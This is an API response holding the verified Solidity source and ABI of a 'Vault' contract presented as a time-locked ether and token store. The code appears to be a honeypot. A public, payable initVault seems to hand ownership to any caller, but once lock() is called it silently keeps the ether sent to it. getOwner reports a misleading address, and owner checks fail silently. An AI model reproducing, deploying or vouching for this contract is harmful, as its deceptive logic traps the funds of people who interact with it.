{"status":"1","message":"OK","result":[{"SourceCode":"// Copyright (C) 2017  The Halo Platform by Scott Morrison\r\n//\r\n// This is free software and you are welcome to redistribute it under certain conditions.\r\n// ABSOLUTELY NO WARRANTY; for details visit: https://www.gnu.org/licenses/gpl-2.0.html\r\n\r\npragma solidity ^0.4.18;\r\n\r\n// minimum token interface\r\ncontract Token {\r\n    function balanceOf(address who) public constant returns (uint256);\r\n    function transfer(address to, uint amount) public returns (bool);\r\n}\r\n\r\ncontract Ownable {\r\n    address Owner = msg.sender;\r\n    modifier onlyOwner { if (msg.sender == Owner) _; }\r\n    function transferOwnership(address to) public onlyOwner { Owner = to; }\r\n}\r\n\r\n// tokens are withdrawable\r\ncontract TokenVault is Ownable {\r\n    address self = address(this);\r\n\r\n    function withdrawTokenTo(address token, address to, uint amount) public onlyOwner returns (bool) {\r\n        return Token(token).transfer(to, amount);\r\n    }\r\n    \r\n    function withdrawToken(address token) public returns (bool) {\r\n        return withdrawTokenTo(token, msg.sender, Token(token).balanceOf(self));\r\n    }\r\n    \r\n    function emtpyTo(address token, address to) public returns (bool) {\r\n        return withdrawTokenTo(token, to, Token(token).balanceOf(self));\r\n    }\r\n}\r\n\r\n// store ether & tokens for a period of time\r\ncontract Vault is TokenVault {\r\n    \r\n    event Deposit(address indexed depositor, uint amount);\r\n    event Withdrawal(address indexed to, uint amount);\r\n    event OpenDate(uint date);\r\n\r\n    mapping (address => uint) public Deposits;\r\n    uint minDeposit;\r\n    bool Locked;\r\n    uint Date;\r\n\r\n    function initVault() payable open {\r\n        Owner = msg.sender;\r\n        minDeposit = 0.25 ether;\r\n        Locked = false;\r\n        deposit();\r\n    }\r\n    \r\n    function MinimumDeposit() public constant returns (uint) { return minDeposit; }\r\n    function ReleaseDate() public constant returns (uint) { return Date; }\r\n    function WithdrawEnabled() public constant returns (bool) { return Date > 0 && Date <= now; }\r\n\r\n    function() public payable { deposit(); }\r\n\r\n    function deposit() public payable {\r\n        if (msg.value > 0) {\r\n            if (msg.value >= MinimumDeposit())\r\n                Deposits[msg.sender] += msg.value;\r\n            Deposit(msg.sender, msg.value);\r\n        }\r\n    }\r\n\r\n    function withdraw(address to, uint amount) public onlyOwner {\r\n        if (WithdrawEnabled()) {\r\n            uint max = Deposits[msg.sender];\r\n            if (max > 0 && amount <= max) {\r\n                to.transfer(amount);\r\n                Withdrawal(to, amount);\r\n            }\r\n        }\r\n    }\r\n\r\n    function setRelease(uint newDate) public { \r\n        Date = newDate;\r\n        OpenDate(Date);\r\n    }\r\n    \r\n    \r\n    function lock() public { Locked = true; } address inited;\r\n    modifier open { if (!Locked) _; inited = msg.sender; }\r\n    function kill() { require(this.balance == 0); selfdestruct(Owner); }\r\n    function getOwner() external constant returns (address) { return inited; }\r\n}","ABI":"[{\"constant\":false,\"inputs\":[{\"name\":\"token\",\"type\":\"address\"},{\"name\":\"to\",\"type\":\"address\"},{\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"withdrawTokenTo\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"Deposits\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"kill\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"initVault\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"token\",\"type\":\"address\"}],\"name\":\"withdrawToken\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"ReleaseDate\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"token\",\"type\":\"address\"},{\"name\":\"to\",\"type\":\"address\"}],\"name\":\"emtpyTo\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"WithdrawEnabled\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"MinimumDeposit\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"newDate\",\"type\":\"uint256\"}],\"name\":\"setRelease\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"deposit\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"to\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"to\",\"type\":\"address\"},{\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"withdraw\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"lock\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"depositor\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"Deposit\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"Withdrawal\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"name\":\"date\",\"type\":\"uint256\"}],\"name\":\"OpenDate\",\"type\":\"event\"}]","ContractName":"Vault","CompilerVersion":"v0.4.18+commit.9cf6e910","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://763c254f905532323a8fbcce989e5e8ccf262e0d29d82e4a2d16c1193a4301f7"}]}